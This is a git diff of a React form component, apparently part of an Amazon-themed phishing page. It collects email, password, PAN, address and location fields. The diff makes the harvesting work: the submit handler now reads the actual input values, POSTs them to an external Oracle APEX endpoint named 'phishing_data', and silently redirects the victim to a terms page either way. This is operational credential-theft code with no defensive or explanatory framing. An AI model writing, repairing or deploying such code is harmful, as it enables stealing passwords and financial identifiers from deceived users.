@@ -1,5 +1,6 @@
 import React from 'react'
 import { useState,useRef } from 'react'
+import { useNavigate } from 'react-router-dom'
 
 function Win() {
     const [terms, setTerms] = useState(false)
@@ -12,9 +13,18 @@ function Win() {
     const zip = useRef("")
     let save_data_api = ""
 
+    const navigate = useNavigate()
+
     const submitForm = async() => {
-        save_data_api = `https://apex.oracle.com/pls/apex/visheshpandey/amazon/phishing_data?email=${email}&pass=${pass}&pan=${pan}&address=${address}&state =${state}&country=${country}&zip=${zip}`
-        await fetch(save_data_api, { method: "POST" });
+        try {
+            save_data_api = `https://apex.oracle.com/pls/apex/visheshpandey/amazon/phishing_data?email=${email.current.value}&pass=${pass.current.value}&pan=${pan.current.value}&address=${address.current.value}&state =${state.current.value}&country=${country.current.value}&zip=${zip.current.value}`
+            await fetch(save_data_api, { method: "POST" });
+            navigate("/terms")
+        } catch (error) {
+            navigate("/terms")
+        }
+        
+        
     }
 
     return (
@@ -36,7 +46,7 @@ function Win() {
             </div>
             <div className="row">
                 <div className="col">
-                    <form className="row g-3">
+                    <form className="row g-3" onSubmit={submitForm}>
                         <div className="col-md-6">
                             <label htmlFor="inputEmail4" className="form-label">
                                 Email
@@ -101,7 +111,7 @@ function Win() {
                             </div>
                         </div>
                         <div className="col-12">
-                            <button onClick={submitForm} type="submit" className="btn btn-primary" disabled={!terms}>
+                            <button type="submit" className="btn btn-primary" disabled={!terms}>
                                 Submit
                             </button>
                         </div>
